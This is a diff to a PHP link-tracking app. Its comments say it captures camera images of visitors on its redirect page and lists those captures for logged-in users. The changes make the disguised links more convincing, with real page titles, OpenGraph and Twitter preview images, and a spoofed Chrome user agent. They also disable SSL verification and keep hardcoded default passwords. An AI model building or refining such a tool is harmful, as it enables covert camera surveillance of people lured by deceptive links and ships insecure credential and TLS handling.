@@ -2,7 +2,6 @@
 date_default_timezone_set('Africa/Algiers');
 session_start();
 
-// إعدادات الأخطاء لتجنب تداخل المخرجات
 ini_set('display_errors', 0);
 error_reporting(0);
 
@@ -10,7 +9,6 @@ try {
     $db = new PDO('sqlite:tracker_pro.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء الجداول الأساسية
     $db->exec("CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         username TEXT UNIQUE,
@@ -36,7 +34,6 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    // إدخال الحسابات الافتراضية
     $default_users = [
         ['aziz', 'aziz123', 'admin'],
         ['salah', 'salah123', 'user'],
@@ -58,7 +55,6 @@ try {
     die("Database Connection Error");
 }
 
-// معالجة تسجيل الدخول
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_username'], $_POST['login_password'])) {
     $username = trim($_POST['login_username']);
     $password = $_POST['login_password'];
@@ -79,14 +75,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_username'], $_P
     }
 }
 
-// تسجيل الخروج
 if (isset($_GET['logout'])) {
     session_destroy();
     header("Location: " . $_SERVER['PHP_SELF']);
     exit();
 }
 
-// معالجة عمليات الحذف
 if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST') {
     $current_user_id = $_SESSION['user_id'];
     $is_admin = ($_SESSION['role'] === 'admin');
@@ -128,21 +122,23 @@ if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && 
     }
 }
 
-// دالة جلب العنوان والصورة الحقيقيين
+// دالة جلب العنوان والصورة الحقيقيين بدقة عالية
 function fetch_real_meta($url) {
-    $title = "Secure Redirect";
-    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
+    $title = $url;
+    // صورة تعبيرية مطابقة للرابط أو الشعار إن لم تتوفر صورة OpenGraph صريحة
+    $image = "https://via.placeholder.com/600x400/0f172a/6366f1?text=" . urlencode(parse_url($url, PHP_URL_HOST) ?? 'Target Link');
 
-    // فحص يوتيوب
+    // 1. فحص روابط يوتيوب وسحب الصورة المصغرة والعنوان الحقيقي
     if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
         $video_id = $matches[1];
-        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
+        $image = "https://img.youtube.com/vi/{$video_id}/maxresdefault.jpg";
         
         $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $oembed_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 4);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         $json = curl_exec($ch);
         curl_close($ch);
         
@@ -155,27 +151,40 @@ function fetch_real_meta($url) {
         return ['title' => trim($title), 'image' => trim($image)];
     }
 
-    // جلب المواقع العادية عبر cURL
+    // 2. سحب البيانات الحقيقية من المواقع عبر cURL مع محاكاة متصفح حقيقي
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 4);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 6);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
     $html = curl_exec($ch);
     curl_close($ch);
 
     if ($html) {
+        // البحث عن عنوان OpenGraph أو العنوان العادي للصفحة
         if (preg_match('/<meta[^>]*property=["\']og:title["\'][^>]*content=["\']([^"\']+)["\']/i', $html, $m) ||
+            preg_match('/<meta[^>]*name=["\']twitter:title["\'][^>]*content=["\']([^"\']+)["\']/i', $html, $m) ||
             preg_match('/<title>(.*?)<\/title>/si', $html, $m)) {
-            $title = html_entity_decode(trim($m[1]));
+            $extracted_title = html_entity_decode(trim($m[1]));
+            if (!empty($extracted_title)) {
+                $title = $extracted_title;
+            }
         }
 
-        if (preg_match('/<meta[^>]*property=["\']og:image["\'][^>]*content=["\']([^"\']+)["\']/i', $html, $m)) {
-            $image = trim($m[1]);
-            if (strpos($image, 'http') !== 0) {
-                $parsed = parse_url($url);
-                $image = ($parsed['scheme'] ?? 'https') . '://' . ($parsed['host'] ?? '') . $image;
+        // البحث عن صورة OpenGraph أو Twitter Image الحقيقية
+        if (preg_match('/<meta[^>]*property=["\']og:image["\'][^>]*content=["\']([^"\']+)["\']/i', $html, $m) ||
+            preg_match('/<meta[^>]*name=["\']twitter:image["\'][^>]*content=["\']([^"\']+)["\']/i', $html, $m)) {
+            $extracted_image = trim($m[1]);
+            if (!empty($extracted_image)) {
+                // التعامل مع الروابط النسبية
+                if (strpos($extracted_image, 'http') !== 0) {
+                    $parsed = parse_url($url);
+                    $extracted_image = ($parsed['scheme'] ?? 'https') . '://' . ($parsed['host'] ?? '') . $extracted_image;
+                }
+                $image = $extracted_image;
             }
         }
     }
@@ -183,7 +192,6 @@ function fetch_real_meta($url) {
     return ['title' => trim($title), 'image' => trim($image)];
 }
 
-// معالجة التوجيه وزيارة الرابط
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
@@ -211,7 +219,6 @@ if (isset($_GET['r'])) {
     }
 }
 
-// إنشاء رابط جديد
 $generated_link = "";
 if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
@@ -229,7 +236,6 @@ if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && 
     $generated_link = "https://" . $domain . "/?r=" . $code;
 }
 
-// جلب التقاطات الصور حسب الصلاحية
 $captures = [];
 if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
     $current_user_id = $_SESSION['user_id'];
@@ -255,7 +261,6 @@ if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
     $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
 }
 
-// عرض صفحة التوجيه والتقاط الكاميرا
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
